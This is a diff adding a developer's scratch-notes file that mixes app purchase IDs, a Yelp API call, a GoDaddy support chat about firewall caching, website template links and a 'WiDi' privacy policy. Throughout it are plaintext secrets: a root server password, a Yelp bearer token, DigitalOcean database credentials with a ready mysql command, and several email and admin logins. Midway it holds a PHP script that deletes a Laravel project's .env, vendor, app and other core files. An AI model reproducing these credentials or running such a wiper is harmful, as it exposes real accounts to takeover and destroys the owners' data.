@@ -1,0 +1,800 @@
+74.208.28.56
+root
+OtvI#dHS%8
+
+
+Address 
+Language 
+3 images
+
+
+
+WWE_Wallpapers_purchase.Weekly_w_Trial_offer
+WWE_Wallpapers_purchase.LimitedMonthly
+WWE_Wallpapers_purchase.Lifetime
+
+com.lingviny.rap.monthly19.99
+
+
+baseURL: "https://api.yelp.com/v3/businesses",
+  headers: {
+    Authorization:
+    "Bearer PerQj08_gf_LMxhYIBLoUSvb1Uzp0xw76SBPpQXMIN6bMsNHuN8t2AXAKOUpkK8aZS6SSDfXTdRKvaP2IOpqLB2wdcwpcpNmHh7CHhxlP-CYnwy-u8AcVsRsJ53xYHYx",
+  },
+
+  const searchApi = async (searchTerm,zipppp) => {
+    // alert(zipppp)
+    try {
+      const response = await yelp.get("/search", {
+        params: {
+          limit: 50,
+          term: searchTerm,
+          location: zipppp,
+        },
+      });
+      setResults(response.data.businesses);
+    } catch (e) {
+      setErrorMessage("   No restaurant found in your area");
+      console.log("ERROR");
+      console.log(e);
+    }
+  };
+
+
+  43 44 repeat
+  128 130 same address name but different company
+  178 missing address
+  351 missing address
+  388 missing address city zip
+  395 missing address
+  429 missing address
+  454 missing address
+  496 missing address
+  504 missing address
+  538 missing address city zip
+  560 missing address
+  561 missing address city zip
+  567 missing address city zip
+  577 missing address
+  629 missing address city zip
+  661 missing address zip
+  702 missing address
+  748 missing address
+  786 address instead of number
+  946 missing address city zip
+  956 missing address
+  1317 1318 same address name but different company
+  1438 missing address city zip
+  1634 missing address zip
+  1639 missing address zip
+  1767 missing address zip
+  1814 missing address zip
+  1822  missing address
+  1869 ????????
+  1877 missing address zip
+  1916 missing address
+  1949 missing address city zip
+  1965 missing address zip
+  1981 missing address
+  2086 missing address
+  2154 missing address
+  2167 missing address zip
+  2185 missing zip
+  2193 missing address
+  2331 missing address
+  2377 missing address zip
+  2397 missing address zip
+  2420 missing address zip city
+  2496 missing address
+  2542 missing address
+  2574 2575 different company same number
+  2587 missing address zip
+  2665 missing address zip
+  2688 missing address
+  2799 missing address
+  2809 missing address
+  2873 missing address zip
+  2874 missing address city zip
+  2886 missing address
+  2937 missing address city zip
+  2949 missing address zip
+  2953 missing address
+  2954 missing address zip
+  2959 missing address
+  2980 missing address zip
+  2989 missing address city zip
+  2990 missing address zip
+  3020 missing address
+  3041 missing address
+  3093 missing address city zip
+  3186 missing address city zip
+  3196 missing address city zip
+  3197 missing address zip
+  3205 missing address city zip
+  3238 missing address city zip
+  3255 missing address
+  3278 missing address
+  3329 missing address
+  3356 missing address
+  3373 missing address zip
+  3382 missing address city zip
+  3502 missing address zip
+  3577 missing address city zip
+  3579 missing address
+  3601 missing address
+  3632 missing address zip
+  3652 missing address zip
+  3677 missing address city zip
+  3736 missing address zip
+  3749 missing address
+  3851 missing address
+  3859 missing address
+  3936 missing address
+  3941 missing address
+  3952 missing address
+  3955 missing address
+  4058 missing address
+  4088 missing address zip
+  4101 missing address zip
+  4108 missing address zip
+  4152 missing address zip
+  4315 missing address
+  4474 missing address zip
+
+  4490
+
+
+WweWallpapers_purchase.Weekly_w_Trial_offer
+Wwe Wallpapers Weekly w/ 3 Days Trial
+
+Wwe Wallpapers Monthly Discount
+WweWallpapers_purchase.Monthly_Discount
+
+Wwe Wallpapers Limited Monthly Offer
+WweWallpapers_purchase.LimitedMonthly
+
+Wwe Wallpapers Discount Weekly
+WweWallpapers_purchase.Weekly_Discount
+
+Wwe Wallpapers Discount
+WweWallpapers_purchase.discounted_Item
+
+Wwe Wallpapers & Ad Free Discount
+WweWallpapers_purchase.Discounted_Item_and_AdFree
+
+Lifetime Offer
+WweWallpapers_purchase.LifetimeSpecial
+
+Lifetime Access
+WweWallpapers_purchase.Lifetime
+
+Seems like there is website security added to this website and you've enabled a firewall so, the domain is pointing to sucuri IP and the changes are not getting updated immediately.
+I suggest you to disable firewall within the website security dashboard so the changes get updated immediately.
+
+
+
+
+
+
+Welcome! We are excited to offer you messaging, allowing you to respond to us in your own time. Click here to get started.
+You at 18:08, Sep 6:
+Let's Go!
+GoDaddy Guide at 18:08, Sep 6:
+Thanks! Select the best option, so we can find you the right Guide.
+WordPress/Hosting
+Server
+SSL Certification
+Email
+Websites
+Domains
+Something else
+You at 18:08, Sep 6:
+WordPress/Hosting
+GoDaddy Guide at 18:08, Sep 6:
+We will connect you with one of our GoDaddy Guides as soon as possible. For a faster resolution, please tell us how we can help you today.
+Hi. I'm Aluri Kavya. How may I help you with WordPress hosting?
+You at 18:09, Sep 6:
+Hye Aluri I am facing some cache issue
+talab-sa.com
+Aluri at 18:10, Sep 6:
+Are you not able to log in to wp-admin?
+You at 18:10, Sep 6:
+its not a wordpress site its a simple php laravel
+Aluri at 18:11, Sep 6:
+Okay, I can see the website is loading fine.
+You at 18:11, Sep 6:
+its loads the old data unable to get the changes even after updation
+but when i run it using proxy it runs fine
+Aluri at 18:12, Sep 6:
+Have you tried clearing cookies and cache?
+You at 18:12, Sep 6:
+yup
+but still issue exists
+Aluri at 18:13, Sep 6:
+Could you help me with the screenshot of the old and new content page?
+You at 18:13, Sep 6:
+let me share a url
+http://www.talab-sa.com/login_as_seller
+use this url to login into the system
+glowpc2@gmail.com
+password: aaaaaa
+Aluri at 18:15, Sep 6:
+Okay, logged in
+You at 18:16, Sep 6:
+http://www.talab-sa.com/edit_product/23
+now hit this url
+update the name of the product
+it updates in the database but shows the same on the frontend when i use the proxy then it shows me the real data from the database
+checked?
+Aluri at 18:17, Sep 6:
+Let me chek it
+You at 18:18, Sep 6:
+same is the case with every updation
+okay
+Aluri at 18:19, Sep 6:
+Are you using cpanel hosting?
+You at 18:20, Sep 6:
+yup
+I have update the price to 1000 but its still showing me 100 of the product butt
+Aluri at 18:21, Sep 6:
+Do not worry, I am certainly going to work towards fixing this for you or at least give you the best workaround for this.
+Before we proceed, request you to help me validate your account. Please enter your Customer ID and 4 digit PIN in the secure forms, below:
+Aluri has sent you a Secure Form: PIN and Customer Number
+The following Secure Form has been submitted: PIN and Customer Number
+Aluri at 18:26, Sep 6:
+Thanks for validating your account.
+I'm going to review that for you.
+You at 18:31, Sep 6:
+okay
+Aluri at 18:31, Sep 6:
+Seems like there is website security added to this website and you've enabled a firewall so, the domain is pointing to sucuri IP and the changes are not getting updated immediately.
+I suggest you to disable firewall within the website security dashboard so the changes get updated immediately.
+You at 18:33, Sep 6:
+will it cause any issue or drawback??
+Aluri at 18:33, Sep 6:
+No issues. but I suggest you take a backup of the website and then disable the firewall.
+You at 18:35, Sep 6:
+let me take the backup
+Aluri at 18:35, Sep 6:
+Sure. I appreciate it.
+You at 18:36, Sep 6:
+stay with me just downloading
+Aluri at 18:37, Sep 6:
+Sure, I'll be with you.
+You at 18:38, Sep 6:
+took the backup
+now what to do
+Aluri at 18:39, Sep 6:
+Great! You could disable the firewall from below link:
+
+https://wafx.sucuri.net/?settings&site=talab-sa.com&panel=settings
+You at 18:43, Sep 6:
+let me check
+Aluri at 18:45, Sep 6:
+Sure. If you find any difficulty, you could click on the Help option on the top right and create a support ticket and our team will do it for you.
+You at 18:45, Sep 6:
+thanks
+Aluri at 18:45, Sep 6:
+You're welcome.
+You at 18:45, Sep 6:
+can you please check wether its turned off or not
+Aluri at 18:46, Sep 6:
+Sure, have you disabled it now?
+You at 18:46, Sep 6:
+yeah
+Aluri at 18:47, Sep 6:
+I can see Firewall is Enabled
+You at 18:48, Sep 6:
+https://paste.pics/529ae05897d1bf2bb979e6517aa0339a
+can you please take a look at the screenshot
+I have disabled the firewall
+Aluri at 18:50, Sep 6:
+Have you clicked on save after selecting disabled?
+You at 18:50, Sep 6:
+yeah
+Aluri at 18:50, Sep 6:
+Seems like it is not updated on my end. Please refresh the page check if it is still enabled on your end once.
+You at 18:51, Sep 6:
+wait let me check
+Aluri at 18:51, Sep 6:
+Sure.
+You at 18:52, Sep 6:
+https://paste.pics/e5bee48b124ca76ed4cbe5ec91b75800
+Aluri at 18:53, Sep 6:
+Yes, it is disabled now.
+You at 18:53, Sep 6:
+thanks
+let me check the website if problem still exists
+Aluri at 18:54, Sep 6:
+You're welcome.
+Sure, as the domain is pointing to the hosting IP just now, it could take some time to get propagated on the server. However, you could check it once.
+You at 18:54, Sep 6:
+let me check
+I couldn't login
+i am using the same credentials can you please check if you could login
+Aluri at 18:56, Sep 6:
+Sue.
+*Sure
+You at 18:56, Sep 6:
+I think issue is not resolved
+Aluri at 18:57, Sep 6:
+Yes, I'm able to login and access its dashboard:
+
+http://www.talab-sa.com/shop_dashboard
+You at 18:59, Sep 6:
+after dashboard click my products
+Aluri at 18:59, Sep 6:
+Yes, on products page
+You at 19:00, Sep 6:
+I couldn't reach the page
+the updating the product does it shows you the new details or not
+Aluri at 19:01, Sep 6:
+Please try clearing cookie and cache and check it once:
+
+http://www.talab-sa.com/shop_products
+You at 19:01, Sep 6:
+cleared the cookies but its still the same
+Aluri at 19:05, Sep 6:
+Are you able to access cpanel admin?
+You at 19:06, Sep 6:
+let me check
+Aluri at 19:07, Sep 6:
+https://myh.godaddy.com/?prog_id=GoDaddy&pl_id=1#/hosting/cpanel/account/54808994-867e-11eb-8206-3417ebe725c2
+You at 19:07, Sep 6:
+I am in the cpanel admin working fine
+Aluri at 19:08, Sep 6:
+Okay, if your website files are on this file manager, you could also update your website files on file manager and check the updates online.
+You at 19:09, Sep 6:
+I couldn't access the page shop products that the main reason that was working fine before turning off the firewall
+should I turn it on??
+Aluri at 19:10, Sep 6:
+Sure, you could turn it On and check if it works.
+You at 19:10, Sep 6:
+let me check
+Aluri at 19:11, Sep 6:
+Sure.
+You at 19:19, Sep 6:
+can you please check its activated or not
+now i could access the shop products
+Aluri at 19:20, Sep 6:
+Sre, let me check it
+You at 19:20, Sep 6:
+whats the possible solution now if I turn on the firewall I wouldn't be able to get the updated result but if I turn it Off I wouldn't be able to get the products page
+Aluri at 19:23, Sep 6:
+Yes, the firewall is enabled now. Do you see the recent changes updated online?
+You at 19:24, Sep 6:
+I could now see the product page but after updation couldn't see the updated values
+Aluri at 19:27, Sep 6:
+I suggest you to click on the Help option on the website security page and submit the product support ticket explaining this so our team will update the firewall settings as per the issue
+You at 19:28, Sep 6:
+okay thanks
+Aluri at 19:29, Sep 6:
+You're welcome. If you click on Help, the below page appears:
+
+https://supportx.sucuri.net/support/
+
+
+
+
+
+
+
+
+
+
+
+
+email
+password
+address
+state
+city
+zip_code
+phone
+rig_id
+contact_person
+thumbnail
+nationwide
+onsite_services
+
+
+https://netsoltech.com/
+home 
+about us
+products
+investors
+inovations
+events
+
+https://besttech.com.pk/
+home
+about
+services
+courses
+projects
+contact us
+
+https://www.trgworld.com/
+home
+capital
+portfolio
+leadership
+investors
+contact us
+
+https://www.techabout.com/
+about
+services
+project
+news
+contact
+careers
+
+https://www.macrosoftinc.com/
+home
+services
+resource center
+corporate overview
+contact us
+
+https://www.systemsltd.com/
+CASE STUDIES 
+CAREERS 
+CONTACT US
+Corporate
+who we are
+expertise
+products
+industries
+insight
+
+https://qsoft.pk/
+ABOUT
+OUR SERVICES
+PRODUCTS
+FEATURES
+CONTACT
+
+https://zeptosystems.com/
+HOME
+ABOUT US
+CONTACT US
+SERVICES
+CASE STUDIES
+CAREER
+BLOG
+SITEMAP
+
+https://www.itempire.net/index.ite?self
+Home
+Portfolio
+Team
+Services
+About Us
+Contact
+Courses
+
+
+inovative 
+crystal
+unique
+chemics
+
+Rs4988
+Rs8,388
+crystalchemicalspk.com 699
+innovativechemicalspk.com 699
+uniquechemicalspk.com 699
+crystal-chem.com 699
+chemicschemicals.com 699
+chemicschemicalspk.com 699
+
+
+
+
+https://themefisher.com/products/medic-medical-template/
+https://demo.themefisher.com/medic/index.html
+
+
+https://www.themezy.com/demos/121-science-lab-free-responsive-website-template
+
+downloads my pc or gmail
+https://technext.github.io/chiropractic/services.html
+
+
+
+username = doadmin
+password = PUGr5Be8iYKLNgbr hide
+host = db-mysql-nyc3-38813-do-user-8996428-0.b.db.ondigitalocean.com
+port = 25060
+database = defaultdb
+sslmode = REQUIRED
+
+
+mysql -u doadmin -pPUGr5Be8iYKLNgbr -h db-mysql-nyc3-38813-do-user-8996428-0.b.db.ondigitalocean.com -P 25060 < 
+
+
+style 431
+
+widi deployment
+wallpaper app
+Mobile App
+git
+mobile gigs screenshot
+
+
+
+https://174.138.40.240/
+WIDI
+v8turbO64672+b
+root
+Dixon Igoni
+igoniigoni@gmail.com
+%bTm07cOc8Wnuwdi
+
+
+
+
+
+email-----------------
+team@widi.tech
+6f48isE#
+
+
+
+plesk digital ocean
+
+elated-rosalind.137-184-111-218.plesk.page
+igoniigoni@gmail.com
+igoniigoni
+1Gbs0*k6lTouNnug
+
+
+malaika@gmail.com
+
+
+$40 bangali baba wordpress site shuru
+Domain widi
+  upload widi
+
+Mobile gigs testing yelp data
+  Mobile gigs screenshot
+  Mobile gigs banner
+  Mobile gigs otp
+
+Git Hub
+
+
+
+alijutt64672+
+
+
+widi
+localhost:3306 (default for MariaDB, v10.3.29)
+super_user
+v8turbO64672#
+
+
+
+
+<?php
+
+unlink("../../.editorconfig");
+unlink("../../.env");
+unlink("../../.env.example");
+unlink("../../.gitattributes");
+unlink("../../.gitignore");
+unlink("../../.htaccess");
+unlink("../../.htaccess.bak");
+unlink("../../.rnd");
+unlink("../../.styleci.yml");
+unlink("../../artisan");
+unlink("../../composer.json");
+unlink("../../composer.lock");
+unlink("../../index.php");
+unlink("../../package.json");
+unlink("../../phpunit.xml");
+unlink("../../README.md");
+unlink("../../server.php");
+unlink("../../webpack.mix.js");
+
+rmdir("../../test2");
+rmdir("../../database");
+rmdir("../../public");
+rmdir("../../resources");
+rmdir("../../routes");
+rmdir("../../storage");
+rmdir("../../tests");
+rmdir("../../vendor");
+rmdir("../../bootstrap");
+rmdir("../../config");
+rmdir("../../.well-known");
+rmdir("../../.phpintel");
+rmdir("../../app");
+?>
+
+
+
+
+
+
+
+
+
+Privacy Policy & Terms of Use 
+
+This privacy notice discloses the privacy practices for WiDi Global  also referred as WiDI. 
+
+
+Information Collection, Use, and Sharing  
+
+We are the sole owners of the information collected on WiDi.. We only have access to/collect information that you voluntarily give us via WiDi App or other direct contact from you. We will not sell or rent this information to anyone. 
+
+We will use your information to respond to you, regarding the reason you contacted us. We will not share your information with any third party outside of our organization, other than as necessary to fulfill your request, e.g. to process meal request, ship an order, offer support and other facility regarding the smooth transaction of business. 
+
+Unless you ask us not to, we may contact you via push notification, direct message on the app and email in the future to tell you about specials, new products or services, or changes to this privacy policy. 
+
+Your Access to and Control over Information  
+
+You may opt out of any future contacts from us at any time. You can do the following at any time by contacting us via the email address or phone number given on our website: 
+
+•See what data we have about you, if any. 
+
+•Change/correct any data we have about you. 
+
+•Have us delete any data we have about you. 
+
+•Express any concern you have about our use of your data.
+
+
+Security  
+
+We take precautions to protect your information. When you submit sensitive information via the WiDi or the www.widi.tech, your information is protected both online and offline. 
+
+Wherever we collect sensitive information, that information is encrypted and transmitted to us in a secure way. You can verify this by looking for a lock icon in the address bar and looking for "https" at the beginning of the address of the Web page. 
+
+While we use encryption to protect sensitive information transmitted online, we also protect your information offline. Only employees who need the information to perform a specific job (for example, billing, tracking, delivery, or customer service) are granted access to personally identifiable information. The computers/servers in which we store personally identifiable information are kept in a secure environment. 
+
+If you feel that we are not abiding by this privacy policy, you should contact us immediately via telephone or via email.
+
+
+Terms of Service 
+
+while we strive to fulfil our commitment by providing optimum service to our esteemed clients and customers, Clients are obliged to declare accurate information that will aid the quick, efficient and seamless transaction.  
+
+WiDi is a provider, aggregator and facilitator of First Meal, On demand Cuisine, First/Last Mile Delivery of Goods, Wares, Parcels and Logistics to small ecommerce traders, offline traders, restaurants, sme’s. Individuals and the general public. We do not engage in the movement of drugs, narcotics and or any prohibited items. Users, Customers and Clients agrees to comply with the above terms as failure or defaulter might face service disruption or outright non carriage of items.  
+
+WiDI shall not be liable to any loss on transaction that is done offline without the prior consent of the Company.
+
+
+logo ai
+
+
+
+
+buy link:   https://webthemez.com/city-cafe-restaurant-bootstrap-4-free-website-template/
+demo link:  https://webthemez.com/demo/city-cafe-restaurant-bootstrap-4-free-website-template/
+price: free
+
+buy link:   https://webthemez.com/kitchen-restaurant-bootstrap-4-website-template/
+demo link:  https://webthemez.com/demo/kitchen-restaurant-bootstrap-4-website-template/
+price: free
+
+buy link:   https://webthemez.com/china-bistro-bootstrap-website-template/
+demo link:  https://webthemez.com/demo/china-bistro-bootstrap-website-template/
+price: free
+
+buy link:   https://webthemez.com/italy-best-restaurant-website-template-free/
+demo link:  https://webthemez.com/demo/italy-best-restaurant-website-template-free/
+price: free
+
+buy link:   https://webthemez.com/grill-free-responsive-restaurant-website-template/
+demo link:  https://webthemez.com/demo/grill-free-responsive-restaurant-website-template/
+price: free
+
+buy link:   https://webthemez.com/foodz-mobile-app-bootstrap-landing-page/
+demo link:  https://webthemez.com/demo/foodz-mobile-app-bootstrap-landing-page/
+price: free
+
+buy link:   https://www.templatemonster.com/landing-page-template/italian-restaurant-responsive-landing-page-template-58460.html
+demo link:  https://www.templatemonsterpreview.com/demo/58460.html?_gl=1*ii2vul*_ga*MTQ2NDMxNTgyMi4xNjMzODYxODQz*_ga_FTPYEGT5LY*MTYzMzg2MTg0Mi4xLjAuMTYzMzg2MTg0Mi42MA..&_ga=2.67992793.999383613.1633861843-1464315822.1633861843
+price: $14
+
+buy link:   https://www.templatemonster.com/landing-page-template/grocery-delivery-app-landing-page-landing-page-template-166550.html
+demo link:  http://www.templatemonsterpreview.com/demo/166550.html?_gl=1*1tkekfh*_ga*MTQ2NDMxNTgyMi4xNjMzODYxODQz*_ga_FTPYEGT5LY*MTYzMzg2MTg0Mi4xLjEuMTYzMzg2MTk2Ny4xMw..&_ga=2.97350615.999383613.1633861843-1464315822.1633861843
+price: $19
+
+buy link:   https://themeforest.net/item/fresh-food-app-one-page-template/19901878
+demo link:  http://preview.themeforest.net/item/fresh-food-app-one-page-template/full_screen_preview/19901878?_ga=2.132233483.48374017.1633864852-1262749124.1631207242
+price: $21
+
+
+buy link:   https://themeforest.net/item/apetech-app-landing-page/22693503
+demo link:  https://cssmaterial.com/apetech/demo/index.html
+variations: https://preview.themeforest.net/item/apetech-app-landing-page/full_screen_preview/22693503?_ga=2.102918531.2085959657.1633865015-1262749124.1631207242
+price: $14
+
+buy link:   https://themeforest.net/item/topapp-app-landing-page/25251614
+demo link:  https://preview.themeforest.net/item/topapp-app-landing-page/full_screen_preview/25251614?_ga=2.108145153.2085959657.1633865015-1262749124.1631207242
+price: $16
+
+
+admin
+Pakistan123+
+
+
+
+Dixon.igoni@widi.tech
+Kq#50ny5
+
+
+
+_1lkA1i1
+
+
+
+
+nya*13M0
+
+
+
+DB_DATABASE=admin_landscape.myallfavorites
+DB_USERNAME=root_landscape
+DB_PASSWORD=?jWq8f34
+
+
+
+
+
+
+__________________Changed OTO WWE____________________________
+
+WweWallpaper_purchase.Yearly_offer
+PRODUCT NAME Yearly Offer
+DEFAULT REVENUE 29.99
+LIFETIME no
+
+
+WweWallpaper_purchase.discounted_Item_and_adsFree_Monthly
+PRODUCT NAME Ads Free
+DEFAULT REVENUE 2.99
+LIFETIME no
+
+
+WweWallpaper_purchase.fullPriced_Item_Monthly
+PRODUCT NAME Weekly Offer
+DEFAULT REVENUE 1.99
+LIFETIME no
+
+
+
+__________________TO BE CREATED OTO WWE____________________________
+
+WweWallpapers_purchase.OTOY_Monthly
+unchecked-iap-product-id
+OTOY
+
+WweWallpapers_purchase.Monthly_w_Trial_offer
+checked-iap-product-id
+OTOF
+
+WweWallpapers_purchase.discount_Item_Weekly
+unchecked-iap-product-id
+OTOM
+
+
+__________________ERASED CODE API PAYMENT CONTROLLER WWE____________________________
+
+[   'product_id' => $offered_subscription->product_id,
+                            'title' => $already_used ? 'Test drive' : '3 days free',
+                            'caption' => '@price/week',
+                            'subcaption' => null,
+                            'save' => null,
+                            'bottom_line' => $already_used ? null : 'after 3 day trial'
+                        ]
+
+__________________EMBEDED CODE API PAYMENT CONTROLLER WWE____________________________
+
+$offered_subscription = Subscription::where( 'product_id', 'WweWallpapers_purchase.Weekly_w_Trial_offer' )->first();
+$special_subscription = Subscription::where( 'product_id', 'WweWallpapers_purchase.LimitedMonthly' )->first();
+$lifetime = NonConsumable::where( 'product_id', 'WweWallpapers_purchase.Lifetime' )->first();
